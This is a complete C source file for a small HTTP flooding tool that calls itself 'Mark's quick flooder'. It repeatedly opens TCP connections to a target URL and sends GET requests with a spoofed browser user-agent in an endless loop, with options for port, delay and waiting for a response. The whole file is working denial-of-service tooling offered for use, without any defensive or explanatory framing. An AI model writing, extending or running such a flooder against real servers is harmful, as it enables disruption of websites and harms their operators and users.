#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>

#define PACKET_FORMAT \
	"GET %s HTTP/1.1\r\n" \
	"Host: %s\r\n" \
	"User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36\r\n" \
	"Accept: image/png,image/*;q=0.8,*/*;q=0.5\r\n" \
	"Accept-Language: en-US,en;q=0.5\r\n" \
	"Accept-Encoding: gzip, deflate\r\n" \
	"Connection: close\r\n" \
	"Cache-Control: max-age=0\r\n\r\n"

void flood(char *url, const char *port, int delay, int wait)
{
	int nrequests, i, sockfd;
	size_t size;
	struct addrinfo hints, *ai;
	char *host, *resource;
	fd_set fdset;
	struct timeval tv;
	static char packet[512], buf[1024];
	
	if (strncmp(url, "http://", 7) == 0)
		host = url + 7;
	else host = url;

	resource = strchr(host, '/');
	if (resource == NULL) resource = "/";
	else *resource++ = 0;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	puts("Resolving host...");
	i = getaddrinfo(host, port, &hints, &ai);
	if (i) {
		puts(gai_strerror(i));
		exit(1);
	}

	sprintf(packet, PACKET_FORMAT, resource, host);
	size = strlen(packet);

	tv.tv_sec = 12;
	tv.tv_usec = 0;
	
	nrequests = 0;	
	for (;;) {
		printf("Request %d\n", nrequests++);
		usleep(1000 * delay);
		sockfd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
		if (connect(sockfd, ai->ai_addr, ai->ai_addrlen)) {
			perror("connect");
			continue;
		}
		send(sockfd, packet, size, 0);
		if (wait) {
			for (;;) {
				FD_ZERO(&fdset);
				FD_SET(sockfd, &fdset);
				if (select(sockfd+1, &fdset, NULL, NULL, &tv) <= 0) break;
				i = recv(sockfd, buf, 1024, 0);
				if (i < 1024) break;
			}
		}
		shutdown(sockfd, SHUT_RDWR);
		close(sockfd);
	}
}

void help(const char *program)
{
	printf(
		"Mark's quick flooder v0.1\n"
		"Usage: %s [options] URL...\n"
		"Options:\n"
		"  -p <port>   Connect using port number\n"
		"  -w          Wait for response before sending next packet\n" 
		"  -d <delay>  Millisecond delay before each packet (default: 1000)\n",
		program
	);	
}

int main(int argc, char *argv[])
{
	int i, wait, delay;
	char *resource, *port;
	
	port = "80";
	delay = 1000;
	wait = 0;

	if (argc < 2) {
		help(argv[0]);
		return 1;
	}

	for (i = 1; i < argc; ++i) {
		if (argv[i][0] == '-') {
			switch (argv[i][1]) {
			case 'p':
				port = argv[++i];
				break;
			case 'w':
				wait = 1;
				break;
			case 'd':
				delay = atoi(argv[++i]);
				break;
			}
		} else {
			resource = argv[i];
		}
	}

	flood(resource, port, delay, wait);

	return 0;
}
